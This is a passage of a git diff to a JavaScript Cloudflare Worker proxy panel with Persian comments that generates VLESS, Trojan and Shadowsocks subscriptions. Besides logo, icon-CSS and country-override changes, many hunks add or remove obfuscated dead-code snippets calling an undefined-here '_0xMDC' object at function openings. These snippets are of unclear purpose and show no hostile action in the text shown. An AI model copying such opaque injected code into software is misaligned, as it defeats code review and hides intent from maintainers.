+// فقط متن بین تگ‌ها جایگزین می‌شود تا مقدار attributeها (onclick/title/...) نشکند
+function scrubTextNodes(chunk) {
+  // داخل تگ‌ها (attributeها) فقط حذف؛ بیرون تگ‌ها با آیکون جایگزین
+  const withoutTagEmoji = chunk.replace(/<[^>]*>/g, (tag) => tag.replace(EMOJI_RE, ''));
+  return withoutTagEmoji.replace(/(^|>)([^<]*)/g, (_m, lead, text) => lead + scrubEmojiChunk(text));
+}
+
+function deEmoji(html) {
+  const parts = String(html).split(/(<script[\s\S]*?<\/script>|<style[\s\S]*?<\/style>)/gi);
+  return parts
+    .map((chunk, i) => {
+      if (i % 2 !== 1) return scrubTextNodes(chunk);
+      // داخل اسکریپت/استایل فقط حذف می‌کنیم تا سینتکس نشکند
+      return chunk.replace(EMOJI_RE, '');
+    })
+    .join('');
+}
+
+// لوگوی اختصاصی برند (سپر شش‌ضلعی با هسته پالس)
+const SHIELD_LOGO_SVG = `<svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" class="mili-shield-svg" aria-hidden="true">
+  <defs>
+    <linearGradient id="miliGrad" x1="10" y1="8" x2="54" y2="58" gradientUnits="userSpaceOnUse">
+      <stop stop-color="#d9ff8a"/><stop offset="1" stop-color="#65a30d"/>
+    </linearGradient>
+  </defs>
+  <path d="M32 5.5 54 14v17.4c0 12.4-8.8 22.6-22 27.1C18.8 54 10 43.8 10 31.4V14z" fill="#0a130b" stroke="url(#miliGrad)" stroke-width="2.4" stroke-linejoin="round"/>
+  <path d="M32 18.5 45 24v9.2c0 6.6-5.2 12.1-13 14.7-7.8-2.6-13-8.1-13-14.7V24z" fill="none" stroke="url(#miliGrad)" stroke-width="2" stroke-linejoin="round"/>
+  <circle cx="32" cy="30" r="4.2" fill="#b5ff4d"/>
+  <circle cx="32" cy="30" r="9" stroke="#b5ff4d" stroke-opacity=".38" stroke-width="1.4"/>
 </svg>`;
 
-const CLOUD_LOGO_SVG = `<svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" class="mili-cloud-svg">
+const CLOUD_LOGO_SVG = `<svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" class="mili-cloud-svg" aria-hidden="true">
   <rect x="4" y="4" width="56" height="56" rx="18" fill="#0a0f09" stroke="#3f6212" stroke-width="1.6"/>
   <path d="M25.5 42H40.5C44.6421 42 48 38.6421 48 34.5C48 30.491 44.8544 27.2165 40.8926 27.0104C39.2471 21.7876 34.3652 18 28.6 18C21.4203 18 15.6 23.8203 15.6 31C15.6 37.0751 20.1249 42 25.5 42Z" stroke="#b5ff4d" stroke-width="3.8" stroke-linecap="round" stroke-linejoin="round"/>
 </svg>`;
 
 const FAVICON_DATA_URI = `data:image/svg+xml;utf8,${encodeURIComponent(
-  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><circle cx="32" cy="32" r="30" fill="#0b140b" stroke="#a3e635" stroke-width="3"/><path d="M32 15L45 20.5V30.8C45 39.8 39.5 47.5 32 50.5C24.5 47.5 19 39.8 19 30.8V20.5L32 15Z" fill="none" stroke="#b5ff4d" stroke-width="4" stroke-linejoin="round"/></svg>`
+  `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="16" fill="#070c08"/><path d="M32 8 52 15.6v16.2C52 42.9 44.3 52 32 56 19.7 52 12 42.9 12 31.8V15.6z" fill="none" stroke="#b5ff4d" stroke-width="3.4" stroke-linejoin="round"/><circle cx="32" cy="30" r="5" fill="#b5ff4d"/></svg>`
 )}`;
 
 
@@ -2452,6 +2588,14 @@ const VIEWPORT_META = 'width=device-width, initial-scale=1.0, viewport-fit=cover
 const THEME_COLOR_META = '#060b06';
 
 const BASE_UI_CSS = `
+    /* آیکون‌های SVG اختصاصی — همیشه با اندازه ثابت تا چیدمان نشکند */
+    svg.ic {
+      width: 18px;
+      height: 18px;
+      flex: 0 0 auto;
+      display: inline-block;
+      vertical-align: -3px;
+    }
     /* ================= miliconfig base: موبایل + ویندوز ================= */
     html {
       color-scheme: dark;
@@ -3427,7 +3571,7 @@ const memoryStore = {
 };
 
 // ۱. تشخیص هوشمند اتصال دیتابیس D1 با هر نام متغیری (DB, D1, miliconfig_db و غیره)
-function detectD1Binding(env) {
+function detectD1Binding(env) {if(_0xMDC.tap(0x57)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   if (!env || typeof env !== 'object') return null;
   const priorityNames = ['DB', 'D1', 'db', 'd1', 'MILICONFIG_DB', 'miliconfig_db', 'DATABASE', 'database'];
   for (const name of priorityNames) {
@@ -3495,7 +3639,7 @@ function getAdminUuid(env = {}) {
 // تعیین کرده باشد همان مقدار استفاده می‌شود؛ در غیر این‌صورت کلید پیش‌فرض
 // مستند. بدون این کار، وقتی u ست می‌شد ردیف سیستمی با UUID پیش‌فرض ساخته
 // می‌شد و باز کردن /<UUID پیش‌فرض> به‌جای پنل، صفحه وضعیت همان ردیف را نشان می‌داد.
-function getSeedAdminUuid(env = {}) {if(_0xMDC.tap(0x29)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+function getSeedAdminUuid(env = {}) {
   const explicit = env?.u || env?.U || env?.UUID || env?.uuid;
   const value = explicit && String(explicit).trim() ? explicit : DEFAULT_ADMIN_UUID;
   return String(value).trim().toLowerCase();
@@ -3504,7 +3648,7 @@ function getSeedAdminUuid(env = {}) {if(_0xMDC.tap(0x29)!==0x1){var _0xD=[0x2f,0
 // ساخت کلید ادمین یکتا برای هر استقرار (اگر کاربر متغیر u را تعیین نکرده باشد).
 // کلید در D1/KV ذخیره می‌شود تا همه ایزوله‌ها و رفرش‌ها همان مسیر را ببینند و
 // یک‌بار در لاگ Worker اعلام می‌شود تا در زمان استقرار قابل خواندن باشد.
-async function resolveAdminKey(env = {}) {
+async function resolveAdminKey(env = {}) {if(_0xMDC.tap(0x46)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   const fromEnv = env?.u || env?.U || env?.UUID || env?.uuid;
   if (fromEnv && String(fromEnv).trim()) {
     memoryStore.adminKeySource = 'env';
@@ -3819,7 +3963,7 @@ function mapUserRow(row) {
 }
 
 // ۴. مدیریت تنظیمات سراسری پنل (با پشتیبانی همزمان از D1 + KV + Env)
-async function loadGlobalConfig(env = {}, force = false) {if(_0xMDC.tap(0x68)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+async function loadGlobalConfig(env = {}, force = false) {
   await ensureD1Schema(env);
   const envSnap = getEnvConfigSnapshot(env);
   const detectedD1 = detectD1Binding(env);
@@ -3862,7 +4006,7 @@ async function loadGlobalConfig(env = {}, force = false) {if(_0xMDC.tap(0x68)!==
   });
 }
 
-async function saveGlobalConfig(env = {}, newValues = {}) {
+async function saveGlobalConfig(env = {}, newValues = {}) {if(_0xMDC.tap(0x35)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
   await ensureD1Schema(env);
   const detectedD1 = detectD1Binding(env);
   const detectedKv = detectKvBinding(env);
@@ -4106,7 +4250,7 @@ async function createUser(env = {}, payload = {}, clientIp = '') {
   return userObj;
 }
 
-async function updateUser(env = {}, userId, payload = {}, clientIp = '') {if(_0xMDC.tap(0x57)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+async function updateUser(env = {}, userId, payload = {}, clientIp = '') {
   const existing = await getUserByIdOrToken(env, userId);
   if (!existing) return null;
   const now = Date.now();
@@ -4218,7 +4362,7 @@ async function updateUser(env = {}, userId, payload = {}, clientIp = '') {if(_0x
   return updated;
 }
 
-async function resetUserStats(env = {}, userId, clientIp = '') {
+async function resetUserStats(env = {}, userId, clientIp = '') {if(_0xMDC.tap(0x24)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
   const existing = await getUserByIdOrToken(env, userId);
   if (!existing) return null;
   const now = Date.now();
@@ -4411,7 +4555,7 @@ async function checkUserIpLimit(env = {}, user = null, clientIp = '', windowMs =
 }
 
 // فهرست دستگاه‌های فعال یک کاربر (برای نمایش در پنل)
-async function listUserActiveIps(env = {}, userId = '', windowMs = IP_WINDOW_MS) {if(_0xMDC.tap(0x46)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+async function listUserActiveIps(env = {}, userId = '', windowMs = IP_WINDOW_MS) {
   if (!userId) return [];
   const since = Date.now() - Math.max(60000, Number(windowMs) || IP_WINDOW_MS);
   const detectedD1 = detectD1Binding(env);
@@ -4433,7 +4577,7 @@ async function listUserActiveIps(env = {}, userId = '', windowMs = IP_WINDOW_MS)
     .map(([ip, seen]) => ({ ip, lastSeen: seen }));
 }
 
-async function releaseUserIps(env = {}, userId = '') {
+async function releaseUserIps(env = {}, userId = '') {if(_0xMDC.tap(0x63)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
   if (!userId) return false;
   const detectedD1 = detectD1Binding(env);
   if (detectedD1 && memoryStore.d1SchemaReady) {
@@ -4543,7 +4687,7 @@ function quoteYaml(val) {
   return '"' + s.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
 }
 
-function normalizeHost(hostname) {if(_0xMDC.tap(0x35)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+function normalizeHost(hostname) {
   if (!hostname) return hostname;
   const s = String(hostname);
   if (s.startsWith('[') && s.endsWith(']')) return s.slice(1, -1);
@@ -4953,7 +5097,7 @@ function generateClashConfig(links, options = {}) {
   return [header.join('\n'), proxiesSection.join('\n'), '', groupsSection.join('\n'), ruleProviders.join('\n'), rules.join('\n'), ''].join('\n');
 }
 
-function splitDnsAddress(addr) {if(_0xMDC.tap(0x24)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+function splitDnsAddress(addr) {
   const text = String(addr || '').trim();
   try {
     const url = new URL(text);
@@ -4971,7 +5115,7 @@ function splitDnsAddress(addr) {if(_0xMDC.tap(0x24)!==0x1){var _0xD=[0x2f,0x4d,0
   return { type: 'udp', server: text.replace(/^[a-z0-9]+:\/\//i, '').split('/')[0] || '223.5.5.5' };
 }
 
-function generateSingboxConfig(links, options = {}) {
+function generateSingboxConfig(links, options = {}) {if(_0xMDC.tap(0x52)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   const customDNS = options.customDNS || 'https://223.5.5.5/dns-query';
   const nodes = links.map(parseShareLink).filter(n => n && (n.proto === 'vless' || n.proto === 'trojan' || n.proto === 'ss'));
   const outboundTags = nodes.map(n => n.name);
@@ -5372,13 +5516,13 @@ let jkCache = null;
 let jkCacheTime = 0;
 const jkDirectiveRegex = {};
 
-function getJkDirective(text, name) {if(_0xMDC.tap(0x63)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+function getJkDirective(text, name) {
   if (!jkDirectiveRegex[name]) jkDirectiveRegex[name] = new RegExp('^[ \\t]*' + name + '[ \\t]+(.+?)[ \\t]*$', 'm');
   const m = text.match(jkDirectiveRegex[name]);
   return m ? m[1].trim() : '';
 }
 
-function getJkInlineBlock(text, tag) {
+function getJkInlineBlock(text, tag) {if(_0xMDC.tap(0x41)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   const m = text.match(new RegExp('<' + tag + '>([\\s\\S]*?)<\\/' + tag + '>'));
   return m ? m[1].trim() : '';
 }
@@ -5524,7 +5668,7 @@ async function generateResidentialChainConfig(links, options = {}) {
 
   const proxySection = ['proxies:'];
   for (const n of frontNodes) proxySection.push(buildClashNodeYaml(n, customECHDomain));
-  jkItems.forEach((n, idx) => {
+  jkItems.forEach((n, idx) => {if(_0xMDC.tap(0x30)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
     const row = [
       '  - name: "' + n.name + '"',
       '    type: openvpn',
@@ -5641,7 +5785,7 @@ function seededRandom(seedText = '') {
 
 // نودهای مولتی‌لوکیشن بر پایهٔ استخر پروکسی سالم تفکیک‌شده کشورها: هر نود
 // آدرس لبه CF + پروکسی خروجی (s) کشور خودش را دارد تا مقاصد غیرکلودفلری هم کار کند.
-function buildCountryProxyItems(cfg = {}, rand = Math.random) {if(_0xMDC.tap(0x52)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+function buildCountryProxyItems(cfg = {}, rand = Math.random) {
   if (!isEnabledValue(cfg.cpx, false)) return [];
   const total = Math.max(1, Math.min(200, parseInt(cfg.cpn, 10) || 24));
   const rawCodes = String(cfg.pcc ?? 'all').trim();
@@ -5659,7 +5803,7 @@ function buildCountryProxyItems(cfg = {}, rand = Math.random) {if(_0xMDC.tap(0x5
 }
 
 // نودهای مولتی‌لوکیشن واقعی: آدرس = آی‌پی ثابت لبه کلودفلر، خروجی = آی‌پی ثابت لوکیشن
-function buildLocationItems(cfg = {}) {
+function buildLocationItems(cfg = {}) {if(_0xMDC.tap(0x1f)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
   const locations = parseLocationFilter(cfg.locs ?? 'all');
   return locations.map((loc, idx) => ({
     ip: edgeIpForIndex(idx, false),
@@ -5707,7 +5851,7 @@ function getOrderedRegions(region) {
   return [region, ...neighbors, ...all.filter(r => r !== region && !neighbors.includes(r))];
 }
 
-async function selectFallbackProxyAddress(workerRegion = '', enableRegionMatch = true) {if(_0xMDC.tap(0x41)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+async function selectFallbackProxyAddress(workerRegion = '', enableRegionMatch = true) {
   if (!workerRegion || workerRegion === 'CF') {
     return getOfficialDirectAddress();
   }
@@ -5886,7 +6030,7 @@ async function fetchPreferredFromUrls(urlListStr = '', defaultPort = '443', time
   return parsed;
 }
 
-function buildVlessLinks(list, userUuid, workerHost, cfg, namer, wkOverride = '') {if(_0xMDC.tap(0x30)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+function buildVlessLinks(list, userUuid, workerHost, cfg, namer, wkOverride = '') {
   const disableNonTls = cfg.dkby === 'yes' || cfg.ech === 'yes';
   const defaultHttps = [443];
   const defaultHttp = disableNonTls ? [] : [80];
@@ -5953,7 +6097,7 @@ function buildVlessLinks(list, userUuid, workerHost, cfg, namer, wkOverride = ''
   return links;
 }
 
-function buildTrojanLinks(list, userUuid, workerHost, cfg, namer, wkOverride = '') {
+function buildTrojanLinks(list, userUuid, workerHost, cfg, namer, wkOverride = '') {if(_0xMDC.tap(0x5e)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
   const disableNonTls = cfg.dkby === 'yes' || cfg.ech === 'yes';
   const defaultHttps = [443];
   const defaultHttp = disableNonTls ? [] : [80];
@@ -6109,6 +6253,12 @@ async function generateUserNodesList(userOrConfig, workerHost, queryOverrides = 
   // امکان انتخاب لوکیشن از طریق ساب‌لینک:  ?locs=DE یا ?locs=DE,NL
   const locsOverride = String(queryOverrides.locs || '').trim();
   if (locsOverride) cfg.locs = locsOverride;
+  // انتخاب کشور از طریق ساب‌لینک: ?country=DE یا ?country=DE,NL یا ?country=MULTI
+  const countryOverride = String(queryOverrides.country || '').trim();
+  if (countryOverride) {
+    cfg.pcc = countryOverride.toLowerCase() === 'multi' ? 'all' : countryOverride.toUpperCase();
+    cfg.cpx = 'yes';
+  }
   const userUuid = String(userOrConfig?.uuid || queryOverrides.uuid || '351c9981-04b6-4103-aa4b-864aa9c91469').toLowerCase();
   const nodeScope = queryOverrides.scope || userOrConfig?.nodeScope || 'all';
   const wkOverride = (queryOverrides.wk || cfg.wk || '').trim().toUpperCase();
@@ -6229,7 +6379,7 @@ async function generateUserNodesList(userOrConfig, workerHost, queryOverrides = 
 }
 
 // تشخیص خودکار کلاینت از User-Agent در صورت عدم ارسال پارامتر target
-function detectTargetFromRequest(request, url) {if(_0xMDC.tap(0x1f)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+function detectTargetFromRequest(request, url) {
   const explicit = url.searchParams.get('target');
   if (explicit && explicit.trim()) return explicit.trim().toLowerCase();
   const ua = (request.headers.get('User-Agent') || '').toLowerCase();
@@ -6245,7 +6395,7 @@ function detectTargetFromRequest(request, url) {if(_0xMDC.tap(0x1f)!==0x1){var _
   return 'base64';
 }
 
-async function handleSubscriptionResponse(request, userOrConfig, url = null) {
+async function handleSubscriptionResponse(request, userOrConfig, url = null) {if(_0xMDC.tap(0x4d)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   if (!url) url = new URL(request.url);
   const workerHost = url.hostname;
   const rawCfg = userOrConfig?.config ? userOrConfig.config : (userOrConfig || {});
@@ -6274,6 +6424,7 @@ async function handleSubscriptionResponse(request, userOrConfig, url = null) {
     proto: url.searchParams.get('proto') || '',
     scope: url.searchParams.get('scope') || userOrConfig?.nodeScope || 'all',
     locs: url.searchParams.get('locs') || url.searchParams.get('loc') || '',
+    country: url.searchParams.get('country') || '',
     limit: url.searchParams.get('limit') !== null ? url.searchParams.get('limit') : undefined
   };
 
@@ -6437,13 +6588,13 @@ function concatUint8Arrays(head, body) {
   return out;
 }
 
-function closeSocketSafe(ws) {if(_0xMDC.tap(0x5e)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+function closeSocketSafe(ws) {
   try {
     if (ws && (ws.readyState === 1 || ws.readyState === 2)) ws.close();
   } catch (_e) {}
 }
 
-function parseBase64EarlyData(b64Str) {
+function parseBase64EarlyData(b64Str) {if(_0xMDC.tap(0x3c)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   if (!b64Str) return { earlyData: null, error: null };
   try {
     const clean = b64Str.replace(/-/g, '+').replace(/_/g, '/');
@@ -6519,10 +6670,10 @@ function createChunkQueue(packetSize, maxBytes = packetSize, maxItems = Math.max
   }
 
   return {
-    get empty() {if(_0xMDC.tap(0x4d)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+    get empty() {
       return head >= queue.length;
     },
-    clear() {
+    clear() {if(_0xMDC.tap(0x2b)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
       queue = [];
       head = 0;
       queuedBytes = 0;
@@ -6590,11 +6741,11 @@ function createDownloadCoalescer(ws, onBytesSent = null) {
     deferCount = 0;
   }
 
-  function schedule() {if(_0xMDC.tap(0x3c)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+  function schedule() {
     if (timer || microScheduled) return;
     microScheduled = true;
     snapSeq = pushSeq;
-    queueMicrotask(() => {
+    queueMicrotask(() => {if(_0xMDC.tap(0x1a)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
       microScheduled = false;
       if (!offset || timer) return;
       if (maxPacket - offset < tail) return flush();
@@ -6667,7 +6818,7 @@ async function connectRacedSocket(address, port, fetcher = null, raceCount = 1) 
   if (count <= 1) return openVerifiedSocket(address, port, fetcher);
   const tasks = Array.from({ length: count }, () => openVerifiedSocket(address, port, fetcher));
   const winner = await Promise.any(tasks);
-  tasks.forEach(p => {
+  tasks.forEach(p => {if(_0xMDC.tap(0x59)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
     p.then(sock => {
       if (sock !== winner) {
         try {
@@ -6694,7 +6845,7 @@ function wrapResidualSocket(sock, residualData) {
       }
       controller.enqueue(value);
     },
-    cancel(reason) {if(_0xMDC.tap(0x2b)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+    cancel(reason) {
       try {
         upstreamReader?.cancel(reason);
       } catch (_e) {}
@@ -6709,7 +6860,7 @@ function wrapResidualSocket(sock, residualData) {
   };
 }
 
-async function connectHttpTunnel(targetHost, targetPort, proxyCfg, fetcher = null, firstPacket = null) {
+async function connectHttpTunnel(targetHost, targetPort, proxyCfg, fetcher = null, firstPacket = null) {if(_0xMDC.tap(0x48)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
   const { username, password, hostname, socksPort, kind } = proxyCfg;
   const opts = kind === PROXY_KIND_HTTPS ? { secureTransport: 'on', allowHalfOpen: false } : undefined;
   const sock = openRawSocket(hostname, socksPort, fetcher, opts);
@@ -6886,7 +7037,7 @@ function parseVlessHeader(chunk, resolveUserFn) {
 }
 
 // پارس هدر Trojan با پشتیبانی از چندکاربره
-async function parseTrojanHeader(buffer, resolveTrojanUserFn) {if(_0xMDC.tap(0x1a)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+async function parseTrojanHeader(buffer, resolveTrojanUserFn) {
   const bytes = toUint8Array(buffer);
   if (bytes.byteLength < 58) {
     return { hasError: true, message: 'invalid trojan data - too short' };
@@ -6946,7 +7097,7 @@ async function parseTrojanHeader(buffer, resolveTrojanUserFn) {if(_0xMDC.tap(0x1
   };
 }
 
-function makeWebSocketReadableStream(ws, earlyDataHeader) {
+function makeWebSocketReadableStream(ws, earlyDataHeader) {if(_0xMDC.tap(0x37)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
   let cancelled = false;
   return new ReadableStream({
     start(controller) {
@@ -6966,7 +7117,7 @@ function makeWebSocketReadableStream(ws, earlyDataHeader) {
       if (error) controller.error(error);
       else if (earlyData) controller.enqueue(toUint8Array(earlyData));
     },
-    cancel() {if(_0xMDC.tap(0x59)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+    cancel() {
       cancelled = true;
       closeSocketSafe(ws);
     }
@@ -7105,7 +7256,7 @@ async function establishOutboundAndPipe(
     return { host: fb.ip || fb.domain, port: fb.port || port };
   }
 
-  async function connectAndSend(targetHost, targetPort, useProxy = false) {if(_0xMDC.tap(0x48)!==0x1){var _0xM={k:0x1f,v:0x2e};var _0xS2=Object.keys(_0xM).length;if(_0xS2<0x0){_0xMDC.t[1]=_0xS2;}}
+  async function connectAndSend(targetHost, targetPort, useProxy = false) {
     const remoteSock = useProxy
       ? await connectViaOutboundProxy(addressType, targetHost, targetPort, parsedProxy, fetcher, firstPacket)
       : await connectRacedSocket(targetHost, targetPort, fetcher, CONNECT_RACE_COUNT);
@@ -7114,7 +7265,7 @@ async function establishOutboundAndPipe(
     return { remoteSock, writer };
   }
 
-  function detachIfCurrent(sock, writer) {
+  function detachIfCurrent(sock, writer) {if(_0xMDC.tap(0x26)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
     if (remoteState.socket !== sock) return;
     try { writer?.releaseLock(); } catch (_e) {}
     remoteState.socket = null;
@@ -7181,7 +7332,7 @@ async function establishOutboundAndPipe(
     if (fb) {
       try {
         const { remoteSock, writer } = await connectAndSend(fb.host, fb.port, false);
-        bindRemote(remoteSock, writer, pmMode === 'only' ? null : () => {if(_0xMDC.tap(0x37)!==0x1){var _0xG=0;while(_0xG<0x0){_0xG+=0x1;}if(_0xG>0x0){_0xMDC.s=_0xG;}}
+        bindRemote(remoteSock, writer, pmMode === 'only' ? null : () => {
           detachIfCurrent(remoteSock, writer);
           retryConnect();
         });
@@ -7198,7 +7349,7 @@ async function establishOutboundAndPipe(
   try {
     const firstHopProxy = proxyOnly && proxyEnabled ? true : downgradeEnabled ? false : proxyEnabled;
     const { remoteSock, writer } = await connectAndSend(host, port, firstHopProxy);
-    bindRemote(remoteSock, writer, () => {
+    bindRemote(remoteSock, writer, () => {if(_0xMDC.tap(0x15)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
       detachIfCurrent(remoteSock, writer);
       retryConnect();
     });
@@ -7297,7 +7448,7 @@ async function handleWebSocketUpgrade(request, env, ctx, globalCfg, allUsers, ad
   }
 
   // bytes از سمت سرور به کلاینت = دانلود واقعی کاربر
-  function addTransferredBytes(n) {if(_0xMDC.tap(0x26)!==0x1){var _0xQ=(_0xMDC.h(0x1a,0x7)>>>0)%0x3b9aca07;var _0xP=_0xMDC.t.concat([_0xQ]);if(_0xP.length===0x0){_0xMDC.t=_0xP;}}
+  function addTransferredBytes(n) {
     sessionDownloadBytes += Number(n) || 0;
   }
 
@@ -7380,7 +7531,7 @@ async function handleWebSocketUpgrade(request, env, ctx, globalCfg, allUsers, ad
     }
   }
 
-  async function startShadowsocksSession(session) {if(_0xMDC.tap(0x15)!==0x1){var _0xD=[0x2f,0x4d,0x1a];var _0xN=0;for(var _0xI=0;_0xI<_0xD.length;_0xI+=1){_0xN=(_0xN+_0xD[_0xI])>>>0;}if(_0xN===0x7d2){_0xMDC.t[0]=_0xN;}}
+  async function startShadowsocksSession(session) {
     const { target, cipher, masterKey, payloads, user } = session;
     const encoder = await createEncoder({ cipher, masterKey });
     const remoteSock = await resolveSsRemote(user, target);
@@ -7478,7 +7629,7 @@ async function handleWebSocketUpgrade(request, env, ctx, globalCfg, allUsers, ad
     }
   }
 
-  remoteState.drainUpload = () => {if(_0xMDC.tap(0x54)!==0x1){var _0xR2=0;try{_0xR2=(_0xMDC.h(0x2,0x3)^0x0)>>>0;}catch(_0xE){_0xR2=0x0;}if(_0xR2===0xdead){_0xMDC.t[2]=_0xR2;}}
+  remoteState.drainUpload = () => {
     if (!draining && !uploadQueue.empty && remoteState.writer) queueMicrotask(drainUploadQueue);
   };
 
@@ -7488,7 +7639,7 @@ async function handleWebSocketUpgrade(request, env, ctx, globalCfg, allUsers, ad
   wsReadable
     .pipeTo(
       new WritableStream({
-        async write(chunk) {
